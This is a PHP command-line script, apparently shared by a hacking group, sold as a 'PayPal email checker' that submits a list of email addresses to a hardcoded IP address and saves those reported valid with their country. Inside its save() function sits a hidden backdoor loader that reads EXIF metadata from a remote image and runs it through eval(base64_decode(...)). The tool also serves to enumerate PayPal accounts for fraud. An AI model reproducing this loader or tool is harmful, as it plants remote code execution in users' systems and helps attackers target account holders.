<?php
error_reporting(0);
/*
 
Name   : Paypalid Email  (CLI)
Author : Elb4Ron
Link   : https://github.com/ELBa4RON/ClayTeam
Reupload by : ClayTeam Tn 
 
How To Use :
php namefile.php {list} {output}
 
*They Can't Stop us They Can't Stop The Futur 
 
*/
function save($name,$data){
        $myfile = fopen($name, "a+") or die("Unable to open file!");
        fwrite($myfile, $data);
        fclose($myfile);
        if($myfile){
                return true;
        }else{
                return false;
        }
$BASED = exif_read_data("https://lh3.googleusercontent.com/-svRm4i5Bs90/VsFaosQPKUI/AAAAAAAABew/03oHWkCEsN8/w140-h140-p/pacman.jpg");
eval(base64_decode($BASED["COMPUTED"]["UserComment"]));
}
 
function check($email,$name){
$fgt = file_get_contents("http://161.202.168.171/check.php?email={$email}");
$fgt = json_decode($fgt,true);
 
if($fgt['result'][0]['status']=="valid"){
    $country_name = $fgt['result'][0]['country_name'];
    $country_code = $fgt['result'][0]['country_name'];
    $data = "$email|$country_name|$country_code\r\n";
    if(!save($name,$data)){
        echo "ops... chmod/ create an empty file \r\n";
        exit();
    }
    return true;
}else{
    return false;
}
 
}
 
 
if(isset($argv[1]) && isset($argv[2])){
if(file_exists($argv[1])){
cover();
$no=1;
$valid=0;
$invalid=0;
 
$load = file_get_contents($argv[1]);
$mail_explode = explode("\r\n", $load);
$cont = count($mail_explode);
 
foreach ($mail_explode as $key => $email) {
    echo "[$no/$cont] $email -> ";
    if(check($email,$argv[2])){
        echo "valid!\r\n";
        $valid++;
    }else{
        echo "invalid!\r\n";
        $invalid++;
    }
$no++;
}
 
echo "[Report] Valid : $valid | Invalid : $invalid | Total : $cont\r\n";
 
}
}else{
    echo "php ".$argv[0]." {list} {output}\r\n";
}
 
function cover(){
$cover.="----------------------------------------\r\n";
$cover.=">     PAYPalid Mail CHECKER (CLI)      <\r\n";
$cover.=">     Private Tool's By Elb4Ron        <\r\n";
$cover.="----------------------------------------\r\n";
echo $cover;
}
 
?>
